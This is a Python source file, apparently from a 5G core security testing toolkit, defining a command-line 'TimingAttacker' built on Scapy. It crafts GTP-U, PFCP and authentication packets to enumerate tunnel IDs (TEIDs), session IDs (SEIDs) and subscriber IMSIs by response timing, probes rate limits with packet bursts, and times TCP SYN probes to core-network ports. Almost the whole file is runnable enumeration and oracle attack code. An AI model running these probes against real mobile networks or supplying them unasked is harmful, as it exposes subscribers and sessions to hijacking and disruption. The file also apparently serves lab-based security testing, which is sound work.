#!/usr/bin/env python3
from __future__ import annotations
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
import asyncio
import logging
import time
import statistics
from typing import List, Dict, Optional, Any, Callable, Tuple, TYPE_CHECKING
from dataclasses import dataclass, field
from enum import Enum
from core.async_utils import run_in_executor, AsyncRateLimiter
from core.config import TEST_CONFIG
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.console import Console
from rich.table import Table

logger = logging.getLogger(__name__)

if TYPE_CHECKING:
    from scapy.layers.inet import IP, UDP, TCP
    from scapy.packet import Raw
    from scapy.sendrecv import sr1, send
    from scapy.config import conf
    from scapy.contrib.gtp import GTPHeader

try:
    from scapy.layers.inet import IP, UDP, TCP
    from scapy.packet import Raw
    from scapy.sendrecv import sr1, send
    from scapy.config import conf
    from scapy.contrib.gtp import GTPHeader
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

class TimingAttackType(Enum):
    TEID_ORACLE = "teid_oracle"
    AUTH_TIMING = "auth_timing"
    SESSION_ORACLE = "session_oracle"
    RATE_LIMIT_PROBE = "rate_limit_probe"
    CRYPTO_TIMING = "crypto_timing"

@dataclass
class TimingMeasurement:
    probe_id: int
    probe_value: Any
    response_time: float
    got_response: bool
    response_type: Optional[str] = None

@dataclass
class TimingAnalysis:
    attack_type: TimingAttackType
    measurements: List[TimingMeasurement] = field(default_factory=list)
    baseline_mean: float = 0.0
    baseline_std: float = 0.0
    anomalies: List[TimingMeasurement] = field(default_factory=list)
    
    @property
    def total_probes(self) -> int:
        return len(self.measurements)
    
    @property
    def response_rate(self) -> float:
        if self.total_probes > 0:
            return sum(1 for m in self.measurements if m.got_response) / self.total_probes * 100
        return 0.0

class TimingAttacker:
    def __init__(
        self,
        target_ip: str,
        target_port: int = 2152,
        iface: Optional[str] = None,
        samples_per_probe: int = 5,
        timeout: float = 2.0
    ):
        self.target_ip = target_ip
        self.target_port = target_port
        self.iface = iface or TEST_CONFIG.get("interface")
        self.samples_per_probe = samples_per_probe
        self.timeout = timeout
        self.console = Console()
    
    def _measure_response_time(self, packet: Any) -> Tuple[float, bool, Optional[bytes]]:
        if not SCAPY_AVAILABLE:
            return 0.0, False, None
        
        start = time.perf_counter()
        try:
            conf.verb = 0
            resp = sr1(packet, iface=self.iface, timeout=self.timeout, verbose=0)
            elapsed = time.perf_counter() - start
            
            if resp:
                return elapsed, True, bytes(resp)
            return elapsed, False, None
        except Exception as e:
            elapsed = time.perf_counter() - start
            logger.debug(f"Timing measurement error: {e}")
            return elapsed, False, None
    
    def _calculate_statistics(self, times: List[float]) -> Tuple[float, float, float, float]:
        if not times:
            return 0.0, 0.0, 0.0, 0.0
        
        mean = statistics.mean(times)
        std = statistics.stdev(times) if len(times) > 1 else 0.0
        min_time = min(times)
        max_time = max(times)
        
        return mean, std, min_time, max_time
    
    def teid_oracle_attack(
        self,
        teid_range: range,
        show_progress: bool = True
    ) -> TimingAnalysis:
        analysis = TimingAnalysis(attack_type=TimingAttackType.TEID_ORACLE)
        
        logger.info(f"TEID Oracle Attack: Testing {len(teid_range)} TEIDs")
        logger.info(f"Samples per TEID: {self.samples_per_probe}")
        
        baseline_times: List[float] = []
        
        try:
            if show_progress:
                with Progress(
                    SpinnerColumn(),
                    TextColumn("[progress.description]{task.description}"),
                    BarColumn(),
                    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                    console=self.console
                ) as progress:
                    task = progress.add_task("[cyan]TEID Oracle", total=len(teid_range))
                    
                    for teid in teid_range:
                        times = []
                        got_resp = False
                        
                        for _ in range(self.samples_per_probe):
                            pkt = IP(dst=self.target_ip) / UDP(dport=self.target_port) / GTPHeader(teid=teid, gtp_type=1)
                            elapsed, has_resp, _ = self._measure_response_time(pkt)
                            times.append(elapsed)
                            if has_resp:
                                got_resp = True
                        
                        avg_time = statistics.mean(times)
                        baseline_times.append(avg_time)
                        
                        measurement = TimingMeasurement(
                            probe_id=teid,
                            probe_value=teid,
                            response_time=avg_time,
                            got_response=got_resp
                        )
                        analysis.measurements.append(measurement)
                        progress.update(task, advance=1)
            else:
                for teid in teid_range:
                    times = []
                    got_resp = False
                    
                    for _ in range(self.samples_per_probe):
                        pkt = IP(dst=self.target_ip) / UDP(dport=self.target_port) / GTPHeader(teid=teid, gtp_type=1)
                        elapsed, has_resp, _ = self._measure_response_time(pkt)
                        times.append(elapsed)
                        if has_resp:
                            got_resp = True
                    
                    avg_time = statistics.mean(times)
                    baseline_times.append(avg_time)
                    
                    measurement = TimingMeasurement(
                        probe_id=teid,
                        probe_value=teid,
                        response_time=avg_time,
                        got_response=got_resp
                    )
                    analysis.measurements.append(measurement)
            
            if baseline_times:
                analysis.baseline_mean, analysis.baseline_std, _, _ = self._calculate_statistics(baseline_times)
                
                threshold = analysis.baseline_mean + (2 * analysis.baseline_std)
                for m in analysis.measurements:
                    if m.response_time > threshold or m.got_response:
                        analysis.anomalies.append(m)
            
            self._print_timing_results(analysis)
            return analysis
            
        except KeyboardInterrupt:
            logger.warning("Attack interrupted")
            return analysis
    
    def auth_timing_attack(
        self,
        imsi_list: List[str],
        show_progress: bool = True
    ) -> TimingAnalysis:
        analysis = TimingAnalysis(attack_type=TimingAttackType.AUTH_TIMING)
        
        logger.info(f"Auth Timing Attack: Testing {len(imsi_list)} IMSIs")
        
        baseline_times: List[float] = []
        
        try:
            for idx, imsi in enumerate(imsi_list):
                times = []
                got_resp = False
                
                auth_payload = self._craft_auth_request(imsi)
                
                for _ in range(self.samples_per_probe):
                    pkt = IP(dst=self.target_ip) / UDP(dport=self.target_port) / Raw(load=auth_payload)
                    elapsed, has_resp, _ = self._measure_response_time(pkt)
                    times.append(elapsed)
                    if has_resp:
                        got_resp = True
                
                avg_time = statistics.mean(times)
                baseline_times.append(avg_time)
                
                resp_type = "valid" if got_resp else "invalid"
                
                measurement = TimingMeasurement(
                    probe_id=idx,
                    probe_value=imsi,
                    response_time=avg_time,
                    got_response=got_resp,
                    response_type=resp_type
                )
                analysis.measurements.append(measurement)
            
            if baseline_times:
                analysis.baseline_mean, analysis.baseline_std, _, _ = self._calculate_statistics(baseline_times)
                
                threshold_high = analysis.baseline_mean + (2 * analysis.baseline_std)
                threshold_low = analysis.baseline_mean - (2 * analysis.baseline_std)
                
                for m in analysis.measurements:
                    if m.response_time > threshold_high or m.response_time < threshold_low:
                        analysis.anomalies.append(m)
            
            self._print_timing_results(analysis)
            return analysis
            
        except KeyboardInterrupt:
            logger.warning("Attack interrupted")
            return analysis
    
    def _craft_auth_request(self, imsi: str) -> bytes:
        imsi_bytes = bytes.fromhex(imsi.replace(" ", "")) if len(imsi) == 30 else imsi.encode()
        return b"\x00\x15" + imsi_bytes + b"\x00" * (32 - len(imsi_bytes))
    
    def rate_limit_probe(
        self,
        packet_counts: Optional[List[int]] = None,
        show_progress: bool = True
    ) -> TimingAnalysis:
        if packet_counts is None:
            packet_counts = [1, 5, 10, 25, 50, 100, 200, 500]
        
        analysis = TimingAnalysis(attack_type=TimingAttackType.RATE_LIMIT_PROBE)
        
        logger.info(f"Rate Limit Probe: Testing {len(packet_counts)} burst sizes")
        
        try:
            for idx, count in enumerate(packet_counts):
                times = []
                responses = 0
                
                start = time.perf_counter()
                
                for i in range(count):
                    pkt = IP(dst=self.target_ip) / UDP(dport=self.target_port) / GTPHeader(teid=i, gtp_type=1)
                    pkt_start = time.perf_counter()
                    resp = sr1(pkt, iface=self.iface, timeout=0.5, verbose=0)
                    pkt_elapsed = time.perf_counter() - pkt_start
                    times.append(pkt_elapsed)
                    if resp:
                        responses += 1
                
                total_time = time.perf_counter() - start
                avg_time = statistics.mean(times) if times else 0
                
                measurement = TimingMeasurement(
                    probe_id=idx,
                    probe_value=count,
                    response_time=avg_time,
                    got_response=responses > 0,
                    response_type=f"{responses}/{count} responses in {total_time:.2f}s"
                )
                analysis.measurements.append(measurement)
                
                logger.info(f"  Burst {count}: {responses}/{count} responses, avg {avg_time*1000:.1f}ms")
                
                time.sleep(1)
            
            if len(analysis.measurements) > 1:
                times = [m.response_time for m in analysis.measurements]
                analysis.baseline_mean = statistics.mean(times)
                analysis.baseline_std = statistics.stdev(times) if len(times) > 1 else 0
                
                for m in analysis.measurements:
                    if m.response_time > analysis.baseline_mean * 2:
                        analysis.anomalies.append(m)
            
            self._print_timing_results(analysis)
            return analysis
            
        except KeyboardInterrupt:
            logger.warning("Attack interrupted")
            return analysis
    
    def session_oracle_attack(
        self,
        seid_range: range,
        smf_ip: Optional[str] = None,
        show_progress: bool = True
    ) -> TimingAnalysis:
        target = smf_ip or self.target_ip
        analysis = TimingAnalysis(attack_type=TimingAttackType.SESSION_ORACLE)
        
        logger.info(f"Session Oracle Attack: Testing {len(seid_range)} SEIDs on {target}")
        
        baseline_times: List[float] = []
        
        try:
            for seid in seid_range:
                times = []
                got_resp = False
                
                pfcp_header = b"\x21\x01" + seid.to_bytes(8, 'big') + b"\x00" * 8
                
                for _ in range(self.samples_per_probe):
                    pkt = IP(dst=target) / UDP(dport=8805) / Raw(load=pfcp_header)
                    elapsed, has_resp, _ = self._measure_response_time(pkt)
                    times.append(elapsed)
                    if has_resp:
                        got_resp = True
                
                avg_time = statistics.mean(times)
                baseline_times.append(avg_time)
                
                measurement = TimingMeasurement(
                    probe_id=seid,
                    probe_value=seid,
                    response_time=avg_time,
                    got_response=got_resp
                )
                analysis.measurements.append(measurement)
            
            if baseline_times:
                analysis.baseline_mean, analysis.baseline_std, _, _ = self._calculate_statistics(baseline_times)
                
                threshold = analysis.baseline_mean + (2 * analysis.baseline_std)
                for m in analysis.measurements:
                    if m.response_time > threshold or m.got_response:
                        analysis.anomalies.append(m)
            
            self._print_timing_results(analysis)
            return analysis
            
        except KeyboardInterrupt:
            logger.warning("Attack interrupted")
            return analysis
    
    def _print_timing_results(self, analysis: TimingAnalysis):
        self.console.print(f"\n[bold cyan]Timing Analysis: {analysis.attack_type.value}[/bold cyan]")
        self.console.print(f"Total probes: {analysis.total_probes}")
        self.console.print(f"Response rate: {analysis.response_rate:.1f}%")
        self.console.print(f"Baseline: {analysis.baseline_mean*1000:.2f}ms +/- {analysis.baseline_std*1000:.2f}ms")
        
        if analysis.anomalies:
            self.console.print(f"\n[yellow]Anomalies found: {len(analysis.anomalies)}[/yellow]")
            
            table = Table(title="Timing Anomalies")
            table.add_column("Probe ID", style="cyan")
            table.add_column("Value", style="green")
            table.add_column("Response Time", style="yellow")
            table.add_column("Got Response", style="magenta")
            
            for a in analysis.anomalies[:10]:
                table.add_row(
                    str(a.probe_id),
                    str(a.probe_value)[:20],
                    f"{a.response_time*1000:.2f}ms",
                    "Yes" if a.got_response else "No"
                )
            
            self.console.print(table)
        else:
            self.console.print("[green]No timing anomalies detected[/green]")

def run_teid_oracle(target_ip: str, start: int = 0, end: int = 100) -> TimingAnalysis:
    attacker = TimingAttacker(target_ip)
    return attacker.teid_oracle_attack(range(start, end))

def run_rate_limit_probe(target_ip: str) -> TimingAnalysis:
    attacker = TimingAttacker(target_ip)
    return attacker.rate_limit_probe()

def run_session_oracle(smf_ip: str, start: int = 0, end: int = 100) -> TimingAnalysis:
    attacker = TimingAttacker(smf_ip, target_port=8805)
    return attacker.session_oracle_attack(range(start, end))

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="5G Timing Attacks")
    parser.add_argument("attack", choices=["teid-oracle", "auth-timing", "rate-probe", "session-oracle"])
    parser.add_argument("--target", "-t", required=True, help="Target IP")
    parser.add_argument("--start", type=int, default=0)
    parser.add_argument("--end", type=int, default=100)
    parser.add_argument("--samples", "-s", type=int, default=5)
    
    args = parser.parse_args()
    
    logging.basicConfig(level=logging.INFO)
    
    attacker = TimingAttacker(args.target, samples_per_probe=args.samples)
    
    if args.attack == "teid-oracle":
        attacker.teid_oracle_attack(range(args.start, args.end))
    elif args.attack == "rate-probe":
        attacker.rate_limit_probe()
    elif args.attack == "session-oracle":
        attacker.session_oracle_attack(range(args.start, args.end))
    elif args.attack == "auth-timing":
        test_imsis = [f"00101000000000{i:02d}" for i in range(10)]
        attacker.auth_timing_attack(test_imsis)


async def async_timing_attack(target_ip: str, attack_type: str, teid_range: Optional[range] = None,
                              concurrency: int = 10, callback: Optional[Callable] = None) -> Dict:
    conf.verb = 0
    rate_limiter = AsyncRateLimiter(rate_limit=concurrency)
    attacker = TimingAttacker(target_ip, target_port=2152, samples_per_probe=3)
    
    results: Dict[str, Any] = {"timings": [], "anomalies": [], "attack_type": attack_type}
    
    actual_range = teid_range if teid_range is not None else range(1, 101)
    
    async def probe_single(teid: int):
        async with rate_limiter:
            pkt = IP(dst=target_ip) / UDP(dport=2152) / GTPHeader(teid=teid, gtp_type=1)
            start = time.time()
            resp = await run_in_executor(lambda: sr1(pkt, timeout=1.0, verbose=0))
            elapsed = time.time() - start
            
            result = {"teid": teid, "time": elapsed, "responded": resp is not None}
            results["timings"].append(result)
            
            if callback:
                callback(teid, elapsed, resp is not None)
            
            if elapsed > 0.5:
                results["anomalies"].append(result)
            
            return result
    
    async def probe_tcp(port: int):
        async with rate_limiter:
            pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")
            start = time.time()
            resp = await run_in_executor(lambda: sr1(pkt, timeout=1.0, verbose=0))
            elapsed = time.time() - start
            return {"port": port, "time": elapsed, "open": resp is not None}
    
    if attack_type == "teid-oracle":
        tasks = [probe_single(t) for t in actual_range]
        await asyncio.gather(*tasks, return_exceptions=True)
    elif attack_type == "rate-limit":
        rate_result = await run_in_executor(attacker.rate_limit_probe)
        results["rate_limit_info"] = rate_result
    elif attack_type == "tcp-timing":
        ports = [80, 443, 8080, 38412, 36412]
        tasks = [probe_tcp(p) for p in ports]
        tcp_results = await asyncio.gather(*tasks, return_exceptions=True)
        results["tcp_timings"] = [r for r in tcp_results if isinstance(r, dict)]
    
    return results


def send_timing_probe(target_ip: str, port: int, use_tcp: bool = False) -> float:
    if not SCAPY_AVAILABLE:
        return -1.0
    conf.verb = 0
    start = time.time()
    if use_tcp:
        pkt = IP(dst=target_ip) / TCP(dport=port, flags="S")
    else:
        pkt = IP(dst=target_ip) / UDP(dport=port)
    send(pkt, verbose=0)
    return time.time() - start


def run_async_timing_attack(target_ip: str, attack_type: str, teid_range: Optional[range] = None) -> Dict:
    return asyncio.run(async_timing_attack(target_ip, attack_type, teid_range))

